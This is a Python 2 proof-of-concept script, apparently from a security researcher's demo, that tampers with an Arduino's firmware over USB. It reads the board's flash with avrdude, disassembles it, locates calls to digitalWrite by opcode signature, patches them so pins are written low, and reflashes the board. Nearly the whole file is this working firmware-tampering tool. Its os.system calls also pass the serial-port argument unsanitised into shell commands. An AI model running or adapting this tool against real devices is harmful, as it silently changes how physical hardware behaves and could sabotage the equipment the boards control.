#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Demo of automatically tamper Arduino's firmware through USB cable
# Author: Claud Xiao <secmobi@gmail.com>

import sys
import os
from IHex import *
from Utils import *


def FindFunction(asm):
    impl = ''
    calls = []
    result = []

    insts = []
    for line in open(asm, 'r').readlines()[7:]:
        pos = line[:8].strip()
        opcode = line[10:22].strip()
        ass = line[23:].split(';')[0].strip()
        insts.append((pos, opcode, ass))

    blocks = []
    begin = 0
    for i in range(len(insts)):
        if insts[i][2] == 'ret':
            blocks.append((begin, i))
            begin = i + 1
            if begin >= len(insts): break

    for block in blocks:
        status = 0

        if impl != '': break

        # low quality signature with inefficiency matching method
        for pos, opcode, ass in insts[block[0]:block[1]+1]:
            if status == 0 and opcode == '82 55': status = 1
            elif status == 1 and opcode == '9f 4f': status = 2
            elif status == 2 and opcode == '86 56': status = 3
            elif status == 3 and opcode == '9f 4f': status = 4
            elif status == 4 and opcode == '4a 57': status = 5
            elif status == 5 and opcode == '5f 4f': status = 6
            elif status == 6: # rjmp to ret
                ops = opcode.split(' ')
                target = '%x' % (int(pos, 16) + int(ops[0], 16) * 2 + 2)
                if len(ops) == 2 and ops[1] == 'c0' and target == insts[block[1]][0]:
                    status = 7
            elif status == 7 and opcode.split(' ')[1] == '30': status = 8
            elif status == 8 and opcode.split(' ')[1] == '30': status = 9
            elif status == 9 and opcode.split(' ')[1] == '30': status = 10 
            elif status == 10 and opcode.split(' ')[1] == '30': status = 11
            elif status == 11 and opcode.split(' ')[1] == '30': status = 12
            elif status == 12 and opcode.split(' ')[1] == '30': status = 13
            elif status == 13 and opcode.split(' ')[1] == '30': status = 14
            elif status == 14 and opcode == 'f8 94': status = 15
            elif status == 15 and opcode.split(' ')[1] == '23': status = 16
            elif status == 16 and opcode.split(' ')[1] == '2b': status = 17

        if status == 17:
            impl = insts[block[0]][0]
            break;

    if impl == '':
        ErrorAndExit('couldn\'t find *digitalWrite*')

    i = 0
    for pos, opcode, ass in insts:
        if ass == 'call\t0x' + impl:
            calls.append(pos)

            for pos, opcode, ass in insts[i-2:i]:
                if not ass.startswith('ldi'): continue
                if ass.endswith('01'):
                    result.append(pos)

        i = i + 1

    return impl, calls, result


def FixHex(origin, target, addrs):
    f = open(target, 'w')

    for line in open(origin, 'r').readlines():
        line = line.strip()
        start_code = line[0]
        byte_count = int(line[1:3], 16)
        start_addr = int(line[3:7], 16)
        record_type = line[7:9]

        if start_code != ':' or ((byte_count * 2 + 11) != len(line)):
            ErrorAndExit('broken ihex file')

        if record_type == '00':
            for addr in addrs:
                addr = int(addr, 16)
                if start_addr <= addr and addr < (start_addr + byte_count):
                    offset = 8 + 2 * (addr - start_addr) + 2
                    newline = line[:offset] + '0' + line[offset+1:-2]
                    line = newline + HexChecksum(newline[1:])

            f.write(line + '\n')
        elif record_type == '01':
            f.write(line)
            break
        else:
            ErrorAndExit('unimplemented record type' + record_type)

    f.close()


def BlindBlink(serial):
    origin_hex = 'dump.hex'
    origin_bin = 'dump.bin'
    origin_asm = 'dump.asm'
    fixed_hex = 'fixed.hex'

    Log('Download firmware from the board to ' + origin_hex) 
    os.system('avrdude -p atmega328p -c arduino -P ' + serial + ' -U flash:r:' + origin_hex + ':i')

    Log('Convert the dump to ' + origin_bin)
    Hex2Bin(origin_hex, origin_bin)

    Log('Disassemble the binary code to ' + origin_asm)
    os.system('avr-objdump -D -b binary -mavr5 ' + origin_bin + ' > ' + origin_asm)

    impl, calls, addrs = FindFunction(origin_asm)
    Log('Found implementation of digitalWrite at 0x' + impl)

    if len(calls) > 0:
        Log('Found %d calls to digitalWrite at %s' % (len(calls), repr(calls)))
    else:
        ErrorAndExit('didn\'t find any call to digitalWrite')

    if len(addrs) > 0:
        Log('Found %d calls need to be fixed' % len(addrs))
    else:
        ErrorAndExit('didn\'t find any calls need to be fixed')
        return

    Log('Fix the dump to ' + fixed_hex)
    FixHex(origin_hex, fixed_hex, addrs)

    Log('Upload fixed firmware to the board')
    os.system('avrdude -p atmega328p -c arduino -P ' + serial + ' -U flash:w:' + fixed_hex + ':i')

    Log('Done!')


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'Usage: ' + __file__ + ' <usb_serial>'
        sys.exit(-1)

    BlindBlink(sys.argv[1])
